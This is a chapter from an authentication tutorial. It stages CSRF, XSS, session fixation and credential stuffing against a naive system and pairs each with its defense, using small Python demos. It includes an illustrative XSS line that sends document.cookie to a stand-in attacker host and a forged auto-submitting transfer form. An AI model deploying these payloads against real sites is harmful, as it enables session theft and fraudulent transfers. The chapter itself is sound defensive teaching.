---
layout: ../../layouts/Chapter.astro
title: 'The Attack Catalog: CSRF, XSS, Fixation & Stuffing'
description: 'Four classic auth attacks, each mapped to the defense that kills it. Build: each attack staged against the naive system, then blocked.'
part: 'Part IV — The Real World'
written: true
---

The auth system has defenses — salted passwords (Ch 2), random tokens (Ch 3),
cookie attributes (Ch 4), pinned JWTs (Ch 6). This chapter stages the four classic
attacks against the naive system and shows the defense that kills each: **CSRF**
(the forged request), **XSS** (the stolen token), **session fixation** (the
pre-planted session), and **credential stuffing** (the breached password list).

## The lie you were told

> "These attacks are exotic."

Each is a top-ten OWASP category with decades of real breaches. And each maps to a
single defense you've already built:

| Attack | The move | The defense |
|---|---|---|
| CSRF | another site's form POSTs to your API with the cookie attached | SameSite=Lax (Ch 4) + CSRF tokens |
| XSS | injected JS reads document.cookie | HttpOnly (Ch 4) + output encoding |
| Session fixation | attacker plants a session id, victim logs in, attacker uses it | rotate the session id at login |
| Credential stuffing | breached password lists against your login | slow KDFs (Ch 2) + rate limits + breach checks |

## CSRF: the forged request

```text
attacker's page: <form action="https://bank/transfer" method="POST">
                   <input name="to" value="attacker"><input name="amount" value="1000">
                 </form> auto-submitted by JS
your browser:    sends the request WITH your bank cookie attached (Ch 4's contract!)
the bank:        sees a valid session cookie → executes the transfer
```

The defenses: **SameSite=Lax** (Ch 4 — the cookie doesn't travel on cross-site
POSTs), plus **CSRF tokens** (a per-form random value the attacker's page can't
know — the servers verify it).

## XSS: the stolen token

```text
injected script: fetch("https://attacker/?c=" + document.cookie)
without HttpOnly: the session token leaves. With HttpOnly: document.cookie
                  doesn't contain it — the cookie exists but JS can't read it.
```

HttpOnly is the defense *for the token*; output encoding is the defense *for the
injection* — both, always.

## Session fixation: the pre-planted session

```text
attacker gets a session id S (e.g., from a link: ?sessionid=S)
victim logs in WITH that session id still in their cookie jar
the server: keeps session S valid, now bound to the VICTIM's account
attacker: uses S — they're the victim.
```

The defense: **rotate the session id at login** (a new token on every privilege
change — Chapter 3's store, re-keyed). The fixation dies because the attacker's
planted id is invalidated at the exact moment it becomes valuable.

## Credential stuffing: the breached list

```text
attackers own billions of breached username/password pairs from OTHER sites
they replay them against your login (users reuse passwords — Ch 2's entropy)
```

The defenses: slow KDFs (Ch 2's cost per guess, × the list), **rate limiting** (per
account and per IP), **breached-password checks** (reject passwords known to be
breached — haveibeenpwned's API), and MFA.

## Prove it to yourself

**1. CSRF, staged and blocked:**

```python
# csrf.py — the forged request with and without the defenses
sessions = {"victim-session": "alice"}              # alice is logged in (Ch 3)
csrf_tokens = {"victim-session": "form-token-42"}   # the per-session form token

def bank_transfer(session_cookie, form_csrf, to, amount):
    # defense 1: SameSite — in a real browser, a cross-site POST omits the cookie:
    if session_cookie is None: return "no cookie: blocked by SameSite"
    # defense 2: the CSRF token must match the session's token:
    if csrf_tokens.get(session_cookie) != form_csrf:
        return "blocked: CSRF token mismatch"
    return f"transferred {amount} to {to}"

attacker_form_csrf = "attacker-guess"               # the attacker's page can't know it
print(bank_transfer("victim-session", attacker_form_csrf, "mallory", 1000))
# blocked: CSRF token mismatch — the forged request dies
```

**2. Fixation, staged and blocked:**

```python
def login_with_rotation(session_store, planted_id, username, password):
    if password != "correct": return None
    new_id = secrets.token_hex(32)                  # ← ALWAYS a fresh id at login
    session_store[new_id] = {"user": username}
    session_store.pop(planted_id, None)             # the attacker's planted id: dead
    return new_id

store = {"planted-by-attacker": {"user": "?"}}
new = login_with_rotation(store, "planted-by-attacker", "alice", "correct")
print("attacker's planted id still valid?:", "planted-by-attacker" in store)  # False
```

## What you now know

- **CSRF** → SameSite + per-form tokens. **XSS** → HttpOnly + encoding.
  **Fixation** → rotate at login. **Stuffing** → slow KDFs + rate limits + breach
  checks. Each attack: one defense.
- The defenses compose (SameSite + CSRF tokens together; rate limits + MFA
  together) — security is layered, never single.
- Every attack exploits a *trust assumption* the browser or server makes — Chapter
  1's promises, attacked at their assumptions.

Next, the finale: every defense composed — **register, login, sessions, logout,
protected routes in ~300 lines**, the complete auth system.
